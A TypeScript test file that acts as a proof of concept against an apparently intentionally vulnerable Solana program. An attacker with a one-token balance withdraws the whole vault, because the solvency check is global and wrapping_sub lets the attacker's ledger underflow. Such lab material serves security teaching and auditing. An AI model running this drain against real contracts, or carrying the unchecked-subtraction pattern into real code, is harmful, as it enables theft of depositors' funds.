/**
 * VULN 06 — Silent integer underflow (wrapping_sub) on the user balance.
 *
 * Access control is correct here; the theft is purely arithmetic. The
 * solvency check looks at the GLOBAL vault, and `balance.wrapping_sub(amount)`
 * wraps around zero. An attacker with balance 0 withdraws the whole vault
 * and their ledger wraps to ~u64::MAX.
 */
import { assert } from "chai";
import {
  PROG_IDS, provider, anchorProgram, findPda, seedsBuf, airdrop, newFundedKeypair,
  createMint, createAccount, mintTo, tokenBalance, BN,
} from "./util";

describe("vuln06 integer underflow", () => {
  const program = anchorProgram("vuln06_overflow", PROG_IDS.vuln06);
  const vaultPda = findPda([seedsBuf("vault")[0]], PROG_IDS.vuln06)[0];
  const balancePdaOf = (user: any) => findPda([seedsBuf("balance")[0], user.publicKey.toBytes()], PROG_IDS.vuln06)[0];

  let mint: any, victim: any, attacker: any;
  let victimAta: any, attackerAta: any, attackerBalance: any;

  before(async () => {
    await airdrop(provider.wallet.publicKey, 50);
    victim = await newFundedKeypair();
    attacker = await newFundedKeypair();

    mint = await createMint(provider.connection, provider.wallet.payer, provider.wallet.publicKey, null, 6);
    victimAta = await createAccount(provider.connection, provider.wallet.payer, mint, victim.publicKey);
    attackerAta = await createAccount(provider.connection, provider.wallet.payer, mint, attacker.publicKey);
    await mintTo(provider.connection, provider.wallet.payer, mint, victimAta, provider.wallet.publicKey, 500);
    await mintTo(provider.connection, provider.wallet.payer, mint, attackerAta, provider.wallet.publicKey, 1);

    await program.methods.initialize().accounts({ mint }).rpc();

    // Honest deposits: victim 500, attacker 1.
    await program.methods.deposit(new BN(500))
      .accounts({ userBalance: balancePdaOf(victim), user: victim.publicKey, userAta: victimAta, vault: vaultPda })
      .signers([victim]).rpc();
    attackerBalance = balancePdaOf(attacker);
    await program.methods.deposit(new BN(1))
      .accounts({ userBalance: attackerBalance, user: attacker.publicKey, userAta: attackerAta, vault: vaultPda })
      .signers([attacker]).rpc();
  });

  it("attacker withdraws 501 with a balance of 1 — the ledger wraps", async () => {
    // Check: amount (501) <= vault.amount (501)  -> passes
    // Then:  1 - 501 wraps to 18446744073709551116
    await program.methods.withdraw(new BN(501))
      .accounts({
        userBalance: attackerBalance,
        user: attacker.publicKey,
        destinationAta: attackerAta,
        vault: vaultPda,
      })
      .signers([attacker])
      .rpc();

    // The attacker received the victim's 500 too.
    assert.equal((await tokenBalance(attackerAta)).toString(), "501"); // 0 leftover + 501
    assert.equal((await tokenBalance(vaultPda)).toString(), "0");

    const bal = await program.account.userBalance.fetch(attackerBalance);
    // u64 wrap: 1 - 501 = 2^64 - 500
    assert.equal(bal.amount.toString(), "18446744073709551116");
  });
});
